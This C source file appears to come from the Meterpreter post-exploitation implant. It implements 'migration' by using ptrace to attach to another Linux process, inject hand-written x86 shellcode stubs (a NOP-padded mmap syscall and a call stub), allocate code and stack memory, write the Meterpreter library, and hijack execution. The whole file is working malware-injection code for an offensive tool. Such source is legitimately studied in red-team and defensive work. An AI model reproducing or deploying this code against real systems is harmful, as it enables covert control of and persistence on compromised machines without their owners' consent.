/*!
 * @file posix/base_inject.c
 * @brief Definition for functions which provide meterpreter library injection.
 * @details These functions are used in order to migrate meterpreter, using
 *          ptrace to debug the new process host, allocate memory for the
 *          meterpreter stage and a new stack, and give control. If something
 *          fails while migration, it should be able to restore the new host
 *          process and continue execution. Once migration is completed, the
 *          original process code isn't executed anymore, this could be solved,
 *          maybe, using clone to execute the meterpreter stage in a new LWP.
 */
#include "base_inject.h"
#include "ptrace.h"

/*
 xor    %ebp,%ebp
 mov    $0xffffffff,%edi
 mov    $0x22,%esi
 mov    $0x7,%edx
 mov    $0x120000,%ecx
 mov    $0x20040000,%ebx
 mov    $0xc0,%eax
 int    $0x80           ; mmap
 int    $0x3            ; trap to allow the debugge to control
*/
/*! @brief mmap code stub */
UCHAR mmap_stub[] =
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x31\xed" \
	"\xbf\xff\xff\xff\xff" \
	"\xbe\x22\x00\x00\x00" \
	"\xba\x07\x00\x00\x00" \
	"\xb9\x00\x00\x12\x00" \
	"\xbb\x00\x00\x04\x20" \
	"\xb8\xc0\x00\x00\x00" \
	"\xcd\x80" \
	"\xcc";

/*
 push   $0x4             ; Options (4 => PASS_FD, 1 => DEBUG)
 push   $0xffffffff      ; Socket
 mov    $0x5a5a5a5a,%eax ; Entry Point
 call   *%eax
 xor    %eax, %eax
 inc    %eax
 int    $0x80            ; exit
*/
/*! @brief call code stub */
UCHAR call_stub[] =
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
	"\x68\x04\x00\x00\x00" \
	"\x68\xff\xff\xff\xff" \
	"\xb8\x5a\x5a\x5a\x5a" \
	"\xff\xd0" \
	"\x31\xc0" \
	"\x40" \
	"\xcd\x80";

/*!
 * @brief Saves the process state.
 * @param pid Process identifier to save.
 * @param s Pointer to \c state to store code and registers.
 * @returns Indication of success or failure.
 * @retval 0 Indicates success.
 */
LONG
save_state(LONG pid, state *s) {
	LONG result = 0;
	LONG i = 0;

	if (s == NULL)
		return ERROR_INVALID_PARAMETER;

	result = getregs(pid, &(s->regs));
	if (result != 0)
		return result;

	result = read_memory(pid, s->regs.eip, s->memory, MMAP_STUB_SIZE);
	if (result != 0)
		return result;

	return 0;
}

/*!
 * @brief Restores the process state and detaches.
 * @param pid Process identifier to restore.
 * @param s Pointer to \c state with code and registers.
 * @param only_memory Idicates if restore only memory at EIP or also registers
 * @returns Indication of success or failure.
 * @retval 0 Indicates success.
 */
LONG
restore_state(LONG pid, state *s, int only_memory) {
	unsigned long *mem_ptr = NULL;
	LONG i = 0;
	LONG result = 0;

	if (s == NULL)
		return ERROR_INVALID_PARAMETER;

 	mem_ptr = (unsigned long *)(s->memory);

	if (mem_ptr == NULL)
		return ERROR_INVALID_PARAMETER;

	result = write_memory(pid, s->regs.eip, mem_ptr, MMAP_STUB_SIZE);
	if (result != 0)
		return result;

	if (only_memory > 0)
		return 0;

	result = setregs(pid, &(s->regs));
	if (result != 0)
		return result;

	result = detach(pid);
	if (result != 0)
		return result;

	return 0;
}

/*!
 * @brief Waits for a trap from the debugged process.
 * @param pid Process identifier to wait.
 * @returns Indication of success or failure.
 * @retval TRUE indicates sigtrap received.
 * @retval FALSE indicates any other event.
 */
BOOL
wait_trap(LONG pid) {
	LONG wait_status = 0;

	waitpid(pid, &wait_status, 0);

	if (WIFSTOPPED(wait_status) && WSTOPSIG(wait_status) == SIGTRAP)
		return TRUE;

	return FALSE;
}

/*!
 * @brief Executes an stub of code on a debugged process.
 * @param pid Process identifier where to execute code.
 * @param addr Process addr to store the code.
 * @param stub Pointer to code stub to execute.
 * @param stub_size ptrace friendly length of the stub to execute.
 * @returns Indication of success or failure.
 * @retval 0 indicates success.
 */
LONG
execute_stub(LONG pid, unsigned long addr, unsigned long *stub, ULONG stub_size) {
	LONG i = 0;
	LONG result = 0;
	struct user_regs_struct stub_regs;

	if (stub_size == 0 || stub == NULL)
		return ERROR_INVALID_PARAMETER;

	result = write_memory(pid, addr, stub, stub_size);
	if (result != 0)
		return result;

	// Jump into the nops stub, makes code modification
	// more reliable.
	result = getregs(pid, &stub_regs);
	if (result != 0)
		return result;
	dprintf("[EXECUTE_STUB] Original EIP 0x%x", stub_regs.eip);

	stub_regs.eip = stub_regs.eip + 8;
	result = setregs(pid, &stub_regs);
	if (result != 0)
		return result;
	dprintf("[EXECUTE_STUB] Redirecting to 0x%x", stub_regs.eip);

	result = cont(pid);
	if (result != 0)
		return result;

	return 0;
}

/*!
 * @brief Allocates memory on a debugged process.
 * @param pid Process identifier of the debugged process.
 * @param regs Pointer to the \c user_regs_struct of the debugged process.
 * @param addr Address to allocate.
 * @param length Size to allocate.
 * @returns Indication of success or failure.
 * @retval 0 indicates success.
 */
LONG
allocate(LONG pid, struct user_regs_struct *regs, unsigned long addr, size_t length)
{
	unsigned long *alloc_code = (unsigned long *)mmap_stub;
	unsigned long *addr_ptr = (unsigned long *)(mmap_stub + MMAP_ADDR_POS);
	size_t *length_ptr = (size_t *)(mmap_stub + MMAP_LENGTH_POS);
	ULONG code_size = MMAP_STUB_SIZE;
	LONG result = 0;

	if (regs == NULL) {
		return ERROR_INVALID_PARAMETER;
	}

	// Fix mmap stub with allocation data
	addr_ptr[0] = addr;
	length_ptr[0] = length;

	result = execute_stub(pid, regs->eip, alloc_code, code_size);
	if (result != 0)
		return result;

	if (wait_trap(pid) == FALSE)
		return ECANCELED; // We don't know what failed in the remote process

	result = getregs(pid, regs);
	if (result != 0)
		return result;

	return 0;
}

/*!
 * @brief Redirects execution on a debugged process.
 * @param pid Process identifier of the debugged process.
 * @param regs Pointer to the \c user_regs_struct of the debugged process.
 * @param addr Address where execution should be redirected.
 * @returns Indication of success or failure.
 * @retval 0 indicates success.
 */
LONG
call(LONG pid, struct user_regs_struct *regs, unsigned long addr) {
	unsigned long *alloc_code = (unsigned long *)call_stub;
	unsigned long *addr_ptr = (unsigned long *)(call_stub + ENTRY_POINT_POS);
	PULONG addr_options_ptr = (PULONG)(call_stub + OPTIONS_POS);
	ULONG code_size = CALL_STUB_SIZE;
	LONG result = 0;

	if (regs == NULL) {
		return ERROR_INVALID_PARAMETER;
	}

	// Fix call stub with entry point
	addr_ptr[0] = addr;
	if (debugging_enabled == 1) {
		addr_options_ptr[0] = 5; // Enable Debugging
	} else {
		addr_options_ptr[0] = 4; // Enable PASSFD (socket sharing)
	}

	result = execute_stub(pid, regs->eip, alloc_code, code_size);
	if (result != 0)
		return result;

	if (wait_trap(pid) == FALSE)
		return ECANCELED; // We don't know what failed in the remote process

	return 0;
}

/*!
 * @brief Injects meterpreter stage library in a process.
 * @param pid Process identifier to inject.
 * @param l Pointer to the \c library to inject.
 * @returns Indication of success or failure.
 * @retval 0 indicates success.
 */
LONG
inject_library(LONG pid, library *l) {
	state s;
	long code_mem;
	long stack_mem;
	struct user_regs_struct regs;
	ULONG library_size = _SIZE_OF(l->length);
	unsigned long *buf_ptr = (unsigned long *)l->data;
	LONG result = 0;

	if (l == NULL) {
		result = ERROR_INVALID_PARAMETER;
		goto end;
	}

	dprintf("[INJECT] Saving state");
	result = attach(pid);
	if (result != 0)
		goto end;

	result = save_state(pid, &s);
	if (result != 0)
		goto end;

	memcpy(&regs, &(s.regs), sizeof(struct user_regs_struct));

	dprintf("[INJECT] Creating new code memory");
	result = allocate(pid, &regs, 0, CODE_SIZE);
	dprintf("[DEBUG] result: %d", result);
	if (result != 0)
		goto restore;

	dprintf("[INJECT] New code memory on 0x%x, fixing registers", regs.eax);
	code_mem = regs.eax;
	regs.eip = code_mem;

	result = setregs(pid, &regs);
	if (result != 0)
		goto restore;

	dprintf("[INJECT] Restoring code on original process");
	restore_state(pid, &s, 1);

	dprintf("[INJECT] Creating new stack");
  	result = allocate(pid, &regs, 0, STACK_SIZE);
	if (result != 0)
		goto restore;

	dprintf("[INJECT] New stack on 0x%x, fixing registers", regs.eax);
	stack_mem = regs.eax + STACK_SIZE;
	regs.esp = stack_mem;
	regs.eip = code_mem;

	result = setregs(pid, &regs);
	if (result != 0)
		goto restore;

	dprintf("[INJECT] Allocating space for the library...");
	result = allocate(pid, &regs, l->base_addr, l->length);
	if (result != 0)
		goto restore;

	if (regs.eax != l->base_addr) {
		result = EFAULT;
		goto restore;
	}

	dprintf("[INJECT] Copying payload to 0x%x", regs.eax);
	result = write_memory(pid, regs.eax, buf_ptr, library_size);
	if (result != 0)
		goto restore;

	dprintf("[INJECT] Fixing registers");
	regs.esp = stack_mem;
	regs.eip = code_mem;
	result = setregs(pid, &regs);
	if (result != 0)
		goto restore;

	dprintf("[INJECT] Executing call stub");
	result = call(pid, &regs, l->entry_point);
	if (result != 0)
		goto restore;

	dprintf("[INJECT] The payload has warned successfully, migration has been successfully");
	result = detach(pid);
	goto end;

restore:
	restore_state(pid, &s, 0);
end:
	return result;
}

